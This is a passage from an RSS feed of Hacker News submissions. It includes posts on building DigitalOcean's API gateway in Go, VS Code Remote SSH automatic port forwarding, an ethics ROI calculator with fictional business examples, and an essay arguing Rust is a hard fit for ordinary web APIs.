  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html">https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</a></em></p>]]>
            </description>
            <link>https://mauricio.github.io/2021/01/14/building-digitaloceans-api-gateway.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25800237</guid>
            <pubDate>Sat, 16 Jan 2021 05:14:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[VS Code Automagic Port Forwarding]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25799210">thread link</a>) | @maxrev17
<br/>
January 15, 2021 | https://www.maxrevitt.com/vs-code-automagical-port-forwarding/ | <a href="https://web.archive.org/web/*/https://www.maxrevitt.com/vs-code-automagical-port-forwarding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">
<section id="site-content-posts">
<article id="post-8">
<p>Date: 16 January 2021</p><div><p>Categories: <a href="https://www.maxrevitt.com/category/coding/" title="coding">coding</a>, <a href="https://www.maxrevitt.com/category/tools/" title="tools">tools</a></p></div>
<p>I was trying to get a development VM working (Windows host, Linux guest). I’d just binned WSL2 as it was causing me a bit of jip, and had been happily coding all day with Remote SSH into my shiny new Ubuntu VM via VS Code. I was, however, having a few problems. The frontend I was working on was using Auth0 for authentication, and that wasn’t happy on a non-localhost domain, with no HTTPS. Webpack to the rescue… give me a dev cert… done and working. Until the frontend tries to make a request to the backend – blocked due to mixed HTTP/HTTPS.</p>
<p>I was going round the houses finding the best solution for getting a system in place to allow both DNS (host file?… lightweight DNS proxy?!), and SSL termination on the VM (nginx, caddy, traefik?!).</p>
<p>After spending a very long time investigating the latest and greatest, I randomly refreshed an old localhost:8081 tab running in Chrome (the site I was working on was running here) and to my surprise, the whole thing loaded, from the Ubuntu VM. To check I wasn’t crackers I checked the logs there, and it was the VM serving my requests. How?! Whaaaaaattt????!!!!!</p>
<p>I could understand this if I’d had a few gins, but no, maybe tired eyes? After some digging, I discovered that if a program outputs a localhost:port style URL into the terminal in VS Code whilst you are using the Remote SSH feature, and you click it, it will automagically setup a port forward.</p>
<figure><img loading="lazy" width="1024" height="140" src="http://maxrevitt.docker.localhost/wp-content/uploads/2021/01/image-1024x140.png" alt="" srcset="https://www.maxrevitt.com/wp-content/uploads/2021/01/image-1024x140.png 1024w, https://www.maxrevitt.com/wp-content/uploads/2021/01/image-300x41.png 300w, https://www.maxrevitt.com/wp-content/uploads/2021/01/image-768x105.png 768w, https://www.maxrevitt.com/wp-content/uploads/2021/01/image-580x79.png 580w, https://www.maxrevitt.com/wp-content/uploads/2021/01/image.png 1352w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Port forward automatically set up on clicking the echo’d link – try it out</figcaption></figure>
<p>What a handy little feature! One worth knowing about for those juxtaposed between Windows and Linux, or just taking advantage of the remote features of VS code. Don’t do what I did and go round the houses, this is a great solution to many problems.</p>
<hr> 
</article>
</section>

</div></div>]]>
            </description>
            <link>https://www.maxrevitt.com/vs-code-automagical-port-forwarding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25799210</guid>
            <pubDate>Sat, 16 Jan 2021 02:03:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ethics can increase revenue in tech businesses]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25799179">thread link</a>) | @elorant
<br/>
January 15, 2021 | https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses | <a href="https://web.archive.org/web/*/https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><div id="viewer-dcqil"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_64495fef8c9a4d93b56b2b9c9e34ccad~mv2.jpg/v1/fit/w_1000%2Ch_602%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_64495fef8c9a4d93b56b2b9c9e34ccad~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg"></p></div></div></div></div><p id="viewer-dpop0"><span><span>As a society we revel in stories of successful individuals that risked it all and won big. It’s so often the rags to riches, starving artist or the struggling entrepreneur that catches the headlines. Outside the world of start-up mythology however it’s more commonly risk aversion that keeps the world of business ticking over. 

<!-- -->Professor Ralph O’Swarm studied risk attitudes in 100 executives and found that they “do not portray the risk-takers we hear so much of in industrial folklore.”, “They quash new ideas in favor of marginal improvements, cost-cutting, and “safe” investments.” </span><a href="https://hbr.org/2020/03/your-company-is-too-risk-averse" target="_blank" rel="noopener"><u><span>hbr.org</span></u></a></span></p><blockquote id="viewer-9tlfe"><span><em><span>In current practice, however, executives in large corporations are reluctant to propose and advocate for risky projects. They quash new ideas in favor of marginal improvements, cost-cutting, and “safe” investments.</span></em></span></blockquote><p id="viewer-bnfgd"><span><span>So why aren’t more businesses making every effort to embed ethics into their organisations and products? At a very rudimentary level embedding ethics into your work will keep you a step ahead of compliance regulation and reduces the risk of negative PR from unethical business practices. Is it because it’s difficult to perceive the potential monetary value of ethics? Or the value lost by not incorporating ethics? 

At Hattusia although we believe that the value of ethics extends far beyond the bottom line on a balance sheet; it does have financial value. We created the Hattusia ROI calculator to look at exactly this. What is the risk of not embedding ethics into your work and what is the potential financial reward? </span></span></p><p id="viewer-5q5uq"><span><span>The following are three examples of (fictional) businesses within three different industries that we’ve put through the Hattusia ROI Calculator. The calculator factors:

✔️ possible market share increases due to ethical innovations</span></span></p><p id="viewer-9kk91"><span><span>✔️ potential market size growth due to your ethical building principles becoming a standard within your industry</span></span></p><p id="viewer-duobf"><span><span>
❌ reputation risk in losing market share because of the negative responses to your product</span></span></p><p id="viewer-80j51"><span><span>❌ regulatory risk of your products or industry receiving bans due to new regulation</span></span></p><p id="viewer-28pg8"><span><span>❌ risk of non-compliance as you may have to make significant changes to your product to comply with new regulation </span></span></p><h2 id="viewer-817r2"><span><strong><span>Seasonal Stay Fever (SSF)</span></strong></span></h2><div id="viewer-d6e3u"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Seasonal Stay Fever"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_59b89f2aef1e40c2856d8d1007dc126a~mv2.jpg/v1/fit/w_1000%2Ch_784%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_59b89f2aef1e40c2856d8d1007dc126a~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt="Seasonal Stay Fever"></p></div><p><span dir="auto">Photo by Robert Bye on Unsplash</span></p></div></div></div><blockquote id="viewer-5vncb"><span><span>SSF will be a platform that uses information like your holiday budget, past holidays, and family size to match you with the perfect Staycation. </span></span></blockquote><p id="viewer-e5djk"><span><span>The biggest potential ethical risk with SSF will come through their use of data. Not only are they obtaining and storing personal information but they are also using this data to make assumptions about their customers. How those assumptions are made and who has access to the data are going to have to be carefully thought through. 

<strong>Market Size:</strong> £93000000000</span></span></p><p id="viewer-casq5"><span><span><strong>Annual Revenue:</strong> £1200000</span></span></p><p id="viewer-66vb4"><span><span><strong>Market Share: </strong> 0.00129</span></span></p><p id="viewer-dbtig"><span><span><strong>Build Cost: </strong>150000</span></span></p><p id="viewer-bvfl3"><span><span><strong>Ethical Concern: </strong>High</span></span></p><div id="viewer-e8ap6"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Hattusia Tech Ethics ROI Calculator - SSF"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_f132446014b748e4971d949c9c4abc7d~mv2.png/v1/fit/w_1000%2Ch_758%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_f132446014b748e4971d949c9c4abc7d~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Hattusia Tech Ethics ROI Calculator - SSF"></p></div></div></div></div><div id="viewer-bj583"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Tech Ethics Value Chart - Seasonal Stay Fever"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_ef4fd2bb66074887a3f2e43ff4200230~mv2.png/v1/fit/w_1000%2Ch_768%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_ef4fd2bb66074887a3f2e43ff4200230~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Tech Ethics Value Chart - Seasonal Stay Fever"></p></div></div></div></div><p id="viewer-5smqt"><span>_________________________________________________________________________</span></p><p id="viewer-7fgnb"><span><span><strong>Want to learn more about ethics in tech? Sign up to our newsletter today.</strong></span></span></p><p id="viewer-9gq1d"><span>_________________________________________________________________________</span></p><h2 id="viewer-e47g6"><span><strong><span>Ingest Dooraly</span></strong></span></h2><div id="viewer-4taqf"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Ingest Dooraly"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_5c4009b7dcdd48839c0ee195a6d8d7b8~mv2.jpg/v1/fit/w_1000%2Ch_574%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_5c4009b7dcdd48839c0ee195a6d8d7b8~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt="Ingest Dooraly"></p></div><p><span dir="auto">Photo by RHSC on Unsplash</span></p></div></div></div><blockquote id="viewer-7phta"><span><span>Ingest Dooraly will be a subscription based website specialising in the next day delivery of non-prescription medication. </span></span></blockquote><p id="viewer-d6k9p"><span><span>As with SSF the business’s access to and use of data will be of high ethical concern. On top of that SSF will have to deal with whether their subscription lengths create a dependency on medication and how they market their products without influencing their customer’s ideas of how healthy or unhealthy they are. We therefore chose to label Ingest Dooraly with a Very High Ethical Concern.</span></span></p><p id="viewer-fe6me"><span><span><strong>Market Size:</strong> £890000000</span></span></p><p id="viewer-e9stt"><span><span><strong>Annual Revenue:</strong> £6000000</span></span></p><p id="viewer-51ll0"><span><span><strong>Market Share: </strong>0.67</span></span></p><p id="viewer-bno7"><span><span><strong>Build Cost: </strong>£600000</span></span></p><p id="viewer-fdae3"><span><span><strong>Ethical Concern: </strong>Very High</span></span></p><div id="viewer-2rkku"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Hattusia Tech Ethics ROI Calculator - Ingest Dooraly"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_11b4b2a7e45d455499cb8341f2badf0e~mv2.png/v1/fit/w_1000%2Ch_762%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_11b4b2a7e45d455499cb8341f2badf0e~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Hattusia Tech Ethics ROI Calculator - Ingest Dooraly"></p></div></div></div></div><div id="viewer-bc0ec"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Tech Ethics Value Chart - Ingest Dooraly"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_6f958b2872614728aa260a892afcb63e~mv2.png/v1/fit/w_1000%2Ch_768%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_6f958b2872614728aa260a892afcb63e~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png" alt="Tech Ethics Value Chart - Ingest Dooraly"></p></div></div></div></div><h2 id="viewer-79t46"><span><strong><span>Ethics and chill</span></strong></span></h2><div id="viewer-fna8s"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img" aria-label="Ethics and Chill"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_4df14e54ba0e4fb19bdd2e0ce0acd457~mv2.jpg/v1/fit/w_1000%2Ch_556%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_4df14e54ba0e4fb19bdd2e0ce0acd457~mv2.jpg/v1/fit/w_300,h_300,al_c,q_5/file.jpg" alt="Ethics and Chill"></p></div><p><span dir="auto">Photo by Jens Kreuter on Unsplash</span></p></div></div></div><blockquote id="viewer-bbrpl"><span><span>A digital streaming service focused towards ethics documentaries.</span></span></blockquote><p id="viewer-93bgh"><span><span>Video Streaming services and media outlets have a pervasive ability to influence our ideas around society and culture. Just recently Faizon Love sued Universal after they removed the only two people of colour from a </span><a href="https://www.thewrap.com/couples-retreat-faizon-love-poster-lawsuit/" target="_blank" rel="noopener"><span><u>movie poster</u></span></a><span> in favour of an all white cast. This ability to create and manipulate the media we consume and therefore ideas around society cannot be dismissed and although ‘Ethics and Chill’ has a unique content focus they would still hold a large amount of persuasive power over their users and the media they publish. </span></span></p><p id="viewer-a90so"><span><span><strong>Market Size:</strong> 1500000000</span></span></p><p id="viewer-3m9j6"><span><span><strong>Annual Revenue:</strong> 54000000</span></span></p><p id="viewer-6e7le"><span><span><strong>Market Share: </strong>3.6%</span></span></p><p id="viewer-85qdn"><span><span><strong>Build Cost:</strong> £1500000</span></span></p><p id="viewer-blrfc"><span><span><strong>Ethical Concern:</strong> High</span></span></p><div id="viewer-easf"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_bc801239143042daacb178f236b453bd~mv2.png/v1/fit/w_1000%2Ch_773%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_bc801239143042daacb178f236b453bd~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><div id="viewer-c2riv"><div><div data-hook="imageViewer" role="button" tabindex="0"><div role="img"><p><img data-pin-url="https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses" data-pin-media="https://static.wixstatic.com/media/575efd_66671e3178d949cd87c8b1c4ce237ab3~mv2.png/v1/fit/w_1000%2Ch_768%2Cal_c%2Cq_80/file.png" src="https://static.wixstatic.com/media/575efd_66671e3178d949cd87c8b1c4ce237ab3~mv2.png/v1/fit/w_300,h_300,al_c,q_5/file.png"></p></div></div></div></div><p id="viewer-dajra"><span><span>The Economist’s Intelligence Unit found that “Responsible AI can improve a firm’s top- and bottom-line growth by increasing customer engagement, broadening revenue streams, offering procurement advantages in competitive bidding processes, and increasing pricing power in the marketplace.” </span><a href="https://www.eiu.com/n/staying-ahead-of-the-curve-the-business-case-for-responsible-ai/?linkId=100000017507301" target="_blank" rel="noopener"><u><span>eiu.com</span></u></a><span> </span><span>
</span>
<span>We’ve seen the potential financial impact that can be caused by not embedding ethical practice into your products as Amazon and IBM have had to remove facial recognition products from the market due to a growing mistrust over the quality of the technology and its applications. As well as the costs of product withdrawals this lack of trust can also be a major barrier to future revenue. Just recently Deliveroo lost a court case over their use of what was deemed a discriminatory algorithm. </span><a href="https://www.vice.com/en/article/7k9e4e/court-rules-deliveroo-used-discriminatory-algorithm" target="_blank" rel="noopener"><u><span>vice.com</span></u></a><span> </span></span></p><blockquote id="viewer-deo8q"><span><span><em>“If you can demonstrate that you are a trustworthy designer of technology, that will lead to economic value because more people will want to do business with you”. </em></span></span></blockquote><p id="viewer-1hr18"><span><span>- Will Griffin, Chief Ethics Officer at Hypergiant </span>

<span>The examples above have shown the potential financial reward of embedding tech ethics into your organisation. The Hattusia Ethics ROI calculator is designed to play a part in building your case for tech ethics but it is important to paint a holistic picture about why ethics is vital for modern business. </span></span></p></div></div></div></div></article></div></div>]]>
            </description>
            <link>https://www.hattusia.com/post/how-ethics-can-increase-revenue-in-tech-businesses</link>
            <guid isPermaLink="false">hacker-news-small-sites-25799179</guid>
            <pubDate>Sat, 16 Jan 2021 01:58:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust is a hard way to make a web API]]>
            </title>
            <description>
<![CDATA[
Score 289 | Comments 314 (<a href="https://news.ycombinator.com/item?id=25798008">thread link</a>) | @tmcw
<br/>
January 15, 2021 | https://macwright.com/2021/01/15/rust.html | <a href="https://web.archive.org/web/*/https://macwright.com/2021/01/15/rust.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Rust is an amazing language. It has enabled excellent CLI tools like <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> and <a href="https://github.com/ogham/exa">exa</a>. Companies like Cloudflare are using Rust for their own systems and <a href="https://blog.cloudflare.com/tag/rust/">encouraging people to write Rust to run microservices</a>. Rust makes it possible to write really fast software that’s secure, tiny, and more concise than C++ or C.</p><p>If I were writing a geocoder, a routing engine, a real-time messaging platform, a database, or a CLI tool, Rust would be at the top of the list.</p><p>But last year, I spent some time trying to make Rust work for a plain-vanilla API to power a normal website. It wasn’t a very good fit.</p><h3 id="lots-of-missing-pieces">Lots of missing pieces</h3><p>Rust has a fair number of web server frameworks, database connectors, and parsers. But building authentication? You have only <em>very</em> low-level parts. Where Node.js will give you <a href="http://www.passportjs.org/">passport</a> and Rails has <a href="https://github.com/heartcombo/devise">devise</a> and Django gives you an <a href="https://developer.mozilla.org/en-US/docs/Learn/Server-side/Django/Authentication">auth model out of the box</a>, in Rust you’re going to build this system by learning how to shuttle a shared vec into low-level crypto libraries. There are libraries trying to fix this, like <a href="https://github.com/breard-r/libreauth">libreauth</a>, but they’re nascent and niche. Repeat for plenty of other web framework problem areas.</p><p>How about SDKs? In mainstream languages, you’ll be able to plug into Google Cloud services, AWS, or Stripe by bringing in an official library. Those libraries are mostly great. The <a href="https://aws.amazon.com/sdk-for-javascript/">aws-sdk-js</a> and <a href="https://stripe.com/docs/libraries">Stripe libraries</a>, for example, are incredibly well-designed and maintained.</p><p>Not so with Rust. There are a few third-party libraries trying to fill in the blanks, which is great, but with the sheer velocity of those services, will they really be able to give a quality experience?</p><p>Some people will say <em>well, X language is so good you can just write an SDK yourself in a weekend!</em> To which I must reply, no.</p><p>Rust’s ecosystem is rich in other domains. The crates for building CLIs, managing concurrency, doing really impressive operations with binary data and low-level parsers - they’re spectacular.</p><h3 id="rusts-compiler-is-faster-than-it-was-but-still-slow">Rust’s compiler is faster than it was, but still slow</h3><p>I’ve been reading <a href="https://blog.mozilla.org/nnethercote/2020/09/08/how-to-speed-up-the-rust-compiler-one-last-time/">Nicholas Nethercote’s</a> <em>excellent</em> blog for years now, in which he describes how the Rust team has made the compiler faster. And they certainly have made it faster!</p><p>But compared to other languages you build websites with, it’s slow. It’s much slower than the Go compiler and much, much slower than the startup time for interpreted languages like JavaScript, Ruby, and Python.</p><p>Once your code is compiled, everything’s amazing! But in my case, this basic API - which wasn’t even feature-complete and was by no means a complex system - took more than ten minutes to compile. On the weak hardware of <a href="https://cloud.google.com/cloud-build">Google Code Build</a>, it would run out of time, every time. We couldn’t build anything.</p><p>Caching helps as long as you don’t have to rebuild cached dependencies. And, I don’t know, maybe <a href="https://blog.kodewerx.org/2020/06/the-rust-compiler-isnt-slow-we-are.html">slimming down dependencies</a> would help Rust projects compile faster. But <a href="https://serde.rs/">serde</a>, for example - the JSON and other-format serializer/deserializer that nearly everyone uses - takes up a huge chunk of compile time. Should we replace serde with something that compiles faster but lacks great documentation and ecosystem support? It’s a bad trade.</p><h3 id="rust-is-complicated">Rust is complicated</h3><p>Rust makes you think about dimensions of your code that matter tremendously for systems programming. It makes you think about how memory is shared or copied. It makes you think about real but unlikely corner cases and make sure that they’re handled. It helps you write code that’s incredibly efficient in every possible way.</p><p>These are all valid concerns. But for most web applications, they’re not the most important concerns. And buzzword-oriented thinking around them leads to some incorrect assumptions.</p><p>Take, for example, Rust’s safety. This is a big part of the marketing, and it’s absolutely correct: Rust’s main promise is to be both <em>safe</em> and <em>low-level</em> - it works without a garbage collector, while at the same time protecting against memory-based exploits. When you read “safety”, think about Rust competing with C. Code in C can reference arbitrary memory, can easily overflow and segfault. Rust code can be just as fast as that C code, but protect that memory access, and without the cost of a garbage collector or some kind of runtime checking.</p><p>But Rust’s memory rules aren’t more secure than Node.js’s or Python’s. Your web application written in Rust isn’t going to be systematically more or less secure than an application in Python or Ruby. High-level languages with garbage collectors pay a performance penalty in exchange for generally dodging this whole class of exploits and bugs. You can’t reference uninitialized memory in JavaScript because you simply can’t reference memory-as-memory in JavaScript.</p><details><summary>Sidenote…</summary>This is describing the design goal of Node.js and other systems - they do occasionally have bugs that creep into this problem area. The <a href="https://github.com/nodejs/node/issues/4660">previous behavior of Node.js's Buffer object, for example, is a good read.</a></details><p>Heck, if you ask <a href="https://deavid.wordpress.com/2020/01/18/actix-web-is-dead-about-unsafe-rust/">some people</a>, Rust is <em>less secure</em> than a GC’ed language for web apps if you use any crates that have <code>unsafe</code> code - which includes Actix, the most popular web framework, because <a href="https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html">unsafe code allows things like deferencing raw pointers</a>.</p><p>If you’re writing a video game, a pause to run garbage collection is bad. If you’re writing code for a microcontroller, any memory “overhead” or waste is really bad. But most web applications can spare a little memory overhead in exchange for productivity.</p><p>This argument is pretty much the same for the other attributes of Rust. Its concurrency primitives are <em>amazing</em> if you’re doing something complicated and need blistering-fast performance. But if you aren’t? The Rust async ecosystem is challenging, to say the least: there are different sorts of async, projects that span domains to do async implementations of unrelated stuff like <a href="https://tokio.rs/">tokio</a>.</p><p>It feels a lot less like Node.js, which had a good async story but ugly syntax, than Python Tornado or Twisted, which had a weird async story and also ugly syntax.</p><p>Async, I’m sure, will stabilize and homogenize and be a lot easier to do in the future. But I was working in the present.</p><h3 id="the-rust-ecosystem-is-not-web-centric">The Rust ecosystem is not web-centric</h3><p>There are many people currently learning Rust, writing CLI apps or low-level code in Rust, and having an extremely fun time. There are dramatically fewer people using Rust to write plain-vanilla web applications.</p><p>This is an important part of the equation for technology choices: are there people working with the tool <em>and</em> are they roughly in the same domain? Unfortunately, a lot of the incredibly exciting work in the Rust ecosystem has nothing to do with web application servers. There are some promising web frameworks - even a <a href="https://github.com/iron/iron">somewhat higher-level framework</a> - but they’re undoubtedly in a niche. Even Actix, the main web framework, has a <a href="https://github.com/actix/actix-web/graphs/contributors">very top-heavy set of contributors</a>.</p><p>If Rust grows at its current rate, the web portion of the community will reach a sort of critical mass, but right - I don’t think there are enough people using Rust for websites for it to be a practical tool for websites. And compare to other communities in which there are entire companies dedicated to building web applications with existing tools - not cutting-edge work, but the kind of stuff that differentiates a mature technology from a new one.</p><h3 id="the-juniper-crate-invites-n1s">The Juniper crate invites n+1s</h3><p>This part isn’t just about Rust, it’s about the GraphQL ecosystem and Rust’s involvement in that ecosystem is one example.</p><p><a href="https://www.infoq.com/articles/N-Plus-1/">The <strong>n+1</strong> problem</a> is something that everyone building web applications should understand. The gist is: you have a page of photos (1 query). You want to show the author of each photo. How many queries do you end up with: 1, combining the photos &amp; authors, or a query per photo to get the author after retrieving the photos? Or 2 queries, with the second having something like <code>user.id IN ids</code> to fetch all authors in a single pass and then reconnect them to their photos.</p><p>n+1 queries are usually the highest-priority database fixes: they’re usually high-impact, and changing an n+1 query into a single query is usually a big win. And we have lots of ways to try and resolve them: you can write SQL and try to get a lot done in a single query using CTEs and JOINs, like we did at Observable, or use an ORM layer like ActiveRecord that has <a href="https://guides.rubyonrails.org/active_record_querying.html#eager-loading-associations">quick ways to turn n+1 queries into predictable queries</a>.</p><p>We were using <a href="https://github.com/graphql-rust/juniper">Juniper</a>, a <a href="https://graphql.org/">GraphQL</a> server for Rust applications. GraphQL basically lets your <em>frontend application</em> define queries, instead of the backend. You give it a range of things it could query, and the application - React or something else - sends arbitrary queries to the backend.</p><p>This makes things <em>hard</em> for the backend. Any sort of SQL-level optimization is impossible - your server is writing dynamic SQL, so you rely on the intelligence of your GraphQL server, which is not always high. Juniper, for example: n+1 queries by default. The workaround - <a href="https://graphql-rust.github.io/juniper/master/advanced/dataloaders.html">a dataloader</a> - is rough and independently maintained. So at the end of the day, you’re going to have a blisteringly-fast application layer that’s spending all of its time inefficiently querying your database.</p><p>The word is that GraphQL works really well with non-SQL databases which can serve these sorts of requests fast. I’m sure that there’s some special database used internally at Facebook that’s incredible in combination with GraphQL, but the rest of industry is pretty attached to Postgres and its ilk, <a href="https://info.crunchydata.com/blog/postgres-the-batteries-included-database">for good reason</a>.</p><h3 id="lets-have-some-caveats">Let’s have some caveats!</h3><p>So I tried to lead with the main caveat: this isn’t about Rust in general. It’s about using the language and its ecosystem for a particular goal. Simple web APIs.</p><p>The caveat to that: in the general sense, you can build a website with anything and be successful. Remember how OkCupid was <a href="https://github.com/OkCupid/okws">implemented in C++</a>. There’s a popular <a href="https://www.costarastrology.com/">astrology app, Co-star</a>, that’s all Haskell. If you’re great at writing some language and you can hire other people with lots of talent, you can do it and be heroes.</p><p>Another caveat: what I was trying to build was a <a href="https://en.wikipedia.org/wiki/Create,_read,_update_and_delete">CRUD</a>-heavy web application API for a website. It wasn’t a web “service” as you might call them nowadays, something that …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://macwright.com/2021/01/15/rust.html">https://macwright.com/2021/01/15/rust.html</a></em></p>]]>
            </description>
            <link>https://macwright.com/2021/01/15/rust.html</link>
